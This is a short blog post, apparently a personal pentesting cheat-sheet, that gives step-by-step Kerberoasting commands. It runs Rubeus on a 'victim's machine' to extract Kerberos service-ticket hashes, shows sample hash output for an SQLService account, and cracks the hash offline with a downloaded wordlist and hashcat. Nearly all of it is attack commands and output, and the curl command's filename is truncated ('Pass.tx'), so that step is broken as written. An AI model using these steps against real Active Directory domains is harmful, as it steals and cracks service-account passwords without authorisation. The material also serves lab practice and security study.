---
layout: post
title: Kerberoasting - Rubeus
description: Kerberoasting - Rubeus
summary: Kerberoasting - Rubeus
tags: [windows,ad,kerberos]
minute: 1
---
* Launch rubeus on victim’s machine

```batch
Rubeus.exe kerberoast
```

* Wait for some hash to appear. Here is a truncated example.

```batch
[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
[*] PwdLastSet             : 5/25/2020 10:28:26 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.local...
```

* Convert the hash block into single line.

```bash
cat hash_block | tr -d '\n' > hash_single_line
```

* Get a modified rockyou [here](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/Pass.txt) (or use the whole rockyou inside `/usr/share/wordlists`)

```bash
curl -OL https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.tx
```

* Crack using hashcat.

```bash
hashcat -m 13100 -a 0 hash_single_line Pass.txt
```
